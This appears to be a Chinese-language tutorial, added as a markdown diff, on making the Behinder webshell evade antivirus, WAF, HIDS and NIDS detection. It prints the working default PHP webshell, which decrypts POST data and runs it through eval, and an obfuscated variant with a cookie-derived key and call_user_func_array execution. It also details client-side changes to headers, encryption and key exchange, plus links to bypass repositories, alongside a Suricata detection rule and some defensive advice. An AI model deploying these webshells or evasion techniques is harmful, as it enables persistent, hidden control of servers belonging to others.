@@ -1,0 +1,231 @@
+> 本文档旨在深入探讨 Webshell 免杀技术，特别是针对知名 Webshell 管理工具“冰蝎”（Behinder）的二次开发与修改，以绕过主流安全产品（WAF、IDS、HIDS、AV）的检测。我们将从技术原理、环境准备、实战示例到安全总结，系统性地剖析 Webshell 的数据特征与通讯协议，并提供可行的魔改思路。
+
+**仓库推荐：**
+*   [ZREBypass](https://github.com/1276486/ZREBypass)
+*   [XG_NTAI](https://github.com/xiaogang000/XG_NTAI)
+*   [Webshell_Generate](https://github.com/cseroad/Webshell_Generate)
+*   [Bypass_Webshell](https://github.com/hackerxj007/Bypass_Webshell)
+
+---
+
+## 概述
+
+在现代网络攻防对抗中，Webshell 作为一种常见的后门持久化手段，其检测与反检测技术始终是双方博弈的焦点。随着各类基于流量、行为、文件特征的检测引擎日益成熟，传统的、未加处理的 Webshell 已极难生存。攻击者为了实现持久化控制，必须对 Webshell 进行“免杀”处理。
+
+本次研究主要围绕以下三个核心问题展开：
+
+1.  **静态文件免杀**：如何通过加密、混淆、编码等手段，使 Webshell 脚本（如 `shell.php`）不被杀毒软件或文件扫描引擎检测到？
+2.  **动态行为免杀**：如何通过二次开发修改 Webshell 的核心功能（如命令执行、文件管理），使其在执行敏感操作时不被主机安全防护软件（HIDS）拦截？
+3.  **流量特征免杀**：如何通过魔改通讯协议、加密算法和请求结构，使 Webshell 客户端与服务端之间的通信流量不被网络入侵检测系统（NIDS）或 WAF 捕获？
+
+本文将以“冰蝎”为例，重点剖析其工作原理，并演示如何通过修改其数据特征和通讯协议来绕过检测。
+
+## 技术原理
+
+主流 Webshell 检测工具通常从以下几个维度进行布防：
+
+*   **静态特征检测**：扫描文件内容，匹配已知的 Webshell 特征码、危险函数（如 `eval`, `assert`, `system`）以及加密/编码函数的组合。这是最基础的检测方式。
+*   **动态行为监控**：通过 Hook PHP/Java 等语言的底层函数执行，监控脚本的运行时行为。例如，检测 `php-fpm` 进程是否执行了 `whoami`、`ifconfig` 等敏感命令，或进行了异常的文件读写、反弹 Shell 等操作。
+*   **流量特征分析**：在网络边界或服务器上捕获通信数据包，分析其请求/响应的结构、加密特征、特定 Header（如 `User-Agent`, `Accept`）以及数据载荷的熵值等。冰蝎、哥斯拉等工具因其独特的通信协议，是流量检测的重点关注对象。
+
+**冰蝎（Behinder）的核心原理：**
+
+冰蝎的核心思想是**动态密钥协商**和**数据加密传输**。
+
+1.  **密钥协商**：客户端首次请求服务端时，会发送一个包含预共享密钥（在生成 Webshell 时设定）的请求。服务端利用此密钥进行一系列运算，生成一个随机的、仅用于当前会话的动态密钥。这个密钥存储在服务端的 Session 中，并加密后返回给客户端。
+2.  **数据加密**：后续的所有通信，包括执行的命令、返回的结果，都使用这个动态会话密钥进行对称加密（通常是 AES）。
+3.  **代码执行**：服务端 Webshell 本质上是一个“代码执行代理”。它接收客户端加密后的指令数据，解密后通过 `eval()` 或 `assert()` (PHP)、`ClassLoader` (Java)、`Assembly.Load` (.NET) 等机制执行，并将执行结果加密后返回。
+
+因此，要实现对冰蝎的免杀，就必须打破检测引擎对上述环节的依赖。
+
+## 环境准备
+
+为了复现检测与绕过过程，我们需要搭建一个模拟真实环境的攻防实验室。
+
+### 1. 攻击方环境
+
+*   **操作系统**：Kali Linux / Windows
+*   **Webshell 工具**：冰蝎 Behinder v3.0 / v4.0 客户端
+*   **开发工具**：IntelliJ IDEA (用于修改冰蝎客户端源码)、VS Code (用于修改 Webshell 脚本)
+
+### 2. 受害方/检测方环境
+
+*   **Web 服务器**：Ubuntu/CentOS + Apache/Nginx + PHP
+*   **流量监控工具**：Suricata (网络入侵检测系统)
+*   **检测平台**：
+    *   **在线 Webshell 查杀**：
+        *   河马：[https://n.shellpub.com/](https://n.shellpub.com/)
+        *   长亭在线检测：[https://rivers.chaitin.cn/](https://rivers.chaitin.cn/)
+        *   微步在线检测：[https://s.threatbook.com/](https://s.threatbook.com/)
+    *   **主机安全软件**：火绒、D盾、安全狗等。
+    *   **WAF**：雷池 WAF、D盾 WAF 等。
+
+## 实战示例：检测与分析原生冰蝎
+
+在进行魔改之前，我们首先需要验证现有检测工具对原生冰蝎的检测能力。
+
+### 步骤一：部署原生冰蝎 Webshell
+
+将冰蝎 v3.0 默认生成的 `shell.php` 文件上传至 Web 服务器。其核心代码通常如下：
+
+```php
+<?php
+@error_reporting(0);
+session_start();
+$key="e45e329feb5d925b"; // 默认密钥
+$_SESSION['k']=$key;
+$post=file_get_contents("php://input");
+if(!extension_loaded('openssl'))
+{
+    $t="base64_"."decode";
+    $post=$t($post."");
+    for($i=0;$i<strlen($post);$i++) {
+        $post[$i] = $post[$i]^$key[$i+1&15]; 
+    }
+}
+else
+{
+    $post=openssl_decrypt($post, "AES128", $key);
+}
+$arr=explode('|',$post);
+$func=$arr[0];
+$params=$arr[1];
+class C{public function __invoke($p) {eval($p."");}}
+@$func(new C(),$params);
+?>
+```
+
+### 步骤二：配置 Suricata 进行流量检测
+
+Suricata 是一款高性能的网络 IDS、IPS 和网络安全监控引擎。我们可以使用它来加载针对冰蝎的检测规则。
+
+1.  **安装 Suricata**：
+    ```bash
+    sudo apt update
+    sudo apt install suricata -y
+    ```
+
+2.  **获取并配置规则**：
+    社区中有许多针对 Webshell 的 Suricata 规则集。例如，我们可以从 [al0ne/suricata-rules](https://github.com/al0ne/suricata-rules) 下载针对冰蝎3的规则。
+    
+    ```bash
+    # 下载规则文件，例如 Behinder3.rules
+    wget https://raw.githubusercontent.com/al0ne/suricata-rules/main/Behinder3.rules
+    
+    # 将规则文件路径添加到 suricata.yaml 的 rule-files 配置中
+    # sudo nano /etc/suricata/suricata.yaml
+    # rule-files:
+    #   - Behinder3.rules
+    ```
+    
+    一个典型的冰蝎3检测规则可能如下所示：
+    ```suricata
+    alert http any any -> any any (msg:"Behinder 3.0 Webshell Request"; flow:to_server,established; content:"Content-Type|3a 20|application/x-www-form-urlencoded"; content:"Accept|3a 20|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"; content:"Content-Length|3a 20|"; pcre:"/Accept-Language\x3a\s[a-z]{2}\-[A-Z]{2}/"; pcre:"/User-Agent\x3a\s(Mozilla|AppleWebKit|Chrome|Safari)/"; pcre:"/Cache-Control\x3a\sno-cache/"; sid:1000001; rev:1;)
+    ```
+    > **规则解读**：这条规则检测的是冰蝎3客户端发起的 HTTP 请求。它匹配了多个固定的 `Header` 特征，如 `Content-Type`, `Accept`, `Accept-Language` 的格式，以及 `Cache-Control: no-cache`。这些特征组合在一起，构成了冰蝎3客户端的强指纹。
+
+3.  **启动监控**：
+    使用以下命令启动 Suricata，监听指定网卡（如 `eth0`）的流量，并加载我们的规则文件。
+    ```bash
+    sudo suricata -c /etc/suricata/suricata.yaml -i eth0 -S Behinder3.rules
+    ```
+
+4.  **触发与观察**：
+    使用冰蝎客户端连接 Webshell 并执行任意命令（如 `whoami`）。然后查看 Suricata 的日志。
+    ```bash
+    tail -f /var/log/suricata/fast.log
+    ```
+    如果配置正确，你将看到类似 `[**] [1:1000001:1] Behinder 3.0 Webshell Request [**]` 的告警日志，证明流量已被成功识别。
+
+## 关键细节：如何进行二改魔改
+
+既然我们知道了检测的原理，那么绕过的思路也就清晰了：**改变已知的、固定的特征**。
+
+### 1. 静态文件特征修改
+
+*   **变量名/函数名混淆**：将 `$key`, `$post`, `$func` 等变量名替换为无意义的随机字符串。
+*   **垃圾代码填充**：在代码中插入大量与核心逻辑无关的、用于迷惑静态分析引擎的“垃圾代码”。
+*   **加密/编码变形**：
+    *   将 `base64_decode` 拆分为 `"bas"."e64_"."decode"`。
+    *   使用不同的编码方式组合，如 `str_rot13`, `gzuncompress` 等。
+    *   自定义加解密函数，替换掉 `openssl_decrypt` 和 `^` (异或) 运算。
+*   **利用 PHP 特性**：使用 `register_shutdown_function`、`__destruct` 魔术方法等非常规方式执行代码，绕过对 `eval` 的直接监控。
+
+**示例：一个简单的静态免杀变形**
+
+```php
+<?php
+// 简单的静态免杀变形示例
+@session_start();
+
+// 1. 密钥从请求中动态获取，而不是硬编码
+$dynamicKeyPart = $_COOKIE['SESSIONID']; 
+$secretSalt = "a_very_secret_string_for_you";
+$finalKey = md5($dynamicKeyPart . $secretSalt);
+
+$_SESSION['m_k'] = $finalKey; // 2. Session键名修改
+
+$rawData = file_get_contents("php://input");
+
+// 3. 使用不同的解密逻辑
+if (!extension_loaded('openssl')) {
+    $decodedData = base64_decode($rawData);
+    $decryptedData = '';
+    for ($i = 0; $i < strlen($decodedData); $i++) {
+        $decryptedData .= $decodedData[$i] ^ $finalKey[$i % strlen($finalKey)];
+    }
+} else {
+    // 使用不同的加密模式和IV
+    $iv = substr(md5(date("Y-m-d")), 0, 16);
+    $decryptedData = openssl_decrypt($rawData, "AES-256-CBC", $finalKey, 0, $iv);
+}
+
+$dataParts = explode('|', $decryptedData);
+$action = $dataParts[0];
+$payload = $dataParts[1];
+
+// 4. 使用更隐蔽的执行方式
+call_user_func_array($action, array($payload)); 
+
+// 或者使用匿名函数
+// $executor = function($p) { eval($p); };
+// $executor($payload);
+?>
+```
+> **注意**：上述代码仅为思路演示，仍可能被高级引擎检测到。真正的免杀需要更复杂的变形和创造性的代码组织。
+
+### 2. 通讯协议与流量特征修改
+
+这是绕过 NIDS 和 WAF 的关键。我们需要修改冰蝎客户端的源码（Java）。
+
+*   **修改 HTTP Headers**：
+    *   **定位源码**：在冰蝎客户端源码中，搜索发送 HTTP 请求的部分（通常在 `net.rebeyond.behinder.core.ShellService` 类中）。
+    *   **修改内容**：
+        *   将固定的 `Accept`, `Accept-Language` 等 Header 改为随机值，或模拟成普通浏览器的值。
+        *   删除或修改 `Cache-Control: no-cache`。
+        *   将 `Content-Type` 从 `application/x-www-form-urlencoded` 改为 `application/json` 或其他常见类型，并相应地修改服务端接收逻辑。
+        *   修改 `User-Agent`，避免使用默认的 Java UA。
+
+*   **修改加密协议**：
+    *   **替换加密算法**：将默认的 `AES128` (AES/ECB/PKCS5Padding) 替换为 `AES-256-GCM`、`ChaCha20` 等其他算法。这需要客户端和服务端同步修改。
+    *   **自定义密钥协商**：彻底抛弃冰蝎原有的密钥交换逻辑。可以设计一套全新的流程，例如：
+        1.  客户端生成一个随机公私钥对。
+        2.  客户端将公钥发送给服务端。
+        3.  服务端生成一个随机的对称密钥，用客户端的公钥加密后返回。
+        4.  客户端用自己的私钥解密，得到对称密钥。后续通信均使用此密钥。
+        这本质上是实现了简易的 `DH` 或 `RSA` 密钥交换。
+
+*   **修改数据载荷结构**：
+    *   **抛弃 `|` 分隔符**：将 `explode('|', $post)` 的分隔符改为其他特殊字符，或者直接使用 JSON、XML、Protobuf 等结构化数据格式来封装指令和参数。
+    *   **增加随机 Padding**：在加密的数据块前后或中间插入随机长度的无用数据，对抗基于载荷长度和熵值的检测。
+
+## 安全总结
+
+Webshell 的免杀对抗是一个持续演进的动态过程。本文从静态、动态、流量三个维度剖析了以冰蝎为代表的 Webshell 的检测原理与绕过思路。
+
+*   **对于攻击方**：简单的修改已不足以应对现代化的安防产品。深度理解工具原理，并具备二次开发能力，是实现高级绕过的基础。魔改的核心思想是“去特征化”，即让你的 Webshell 在文件层面、行为层面和流量层面都尽可能地不像一个 Webshell，而是像一个正常的业务应用。
+
+*   **对于防守方**：单纯依赖特征库的检测方式已逐渐失效。防守策略应向纵深发展：
+    *   **加强流量分析**：不仅要检测固定特征，更要利用机器学习等手段对流量进行基线建模，发现异常的请求频率、数据包大小、加密熵等。
+    *   **强化主机行为监控**：监控 Web 进程的异常行为链，例如“Nginx 进程 -> php-fpm 进程 -> 执行 /bin/bash -> 建立外连 socket”，这种行为链是高危信号。
+    *   **定期巡检与溯源**：定期进行文件完整性校验和 Webshell 扫描，并对发现的后门进行深入的流量溯源和攻击路径分析，以发现未知的 Webshell 变种。
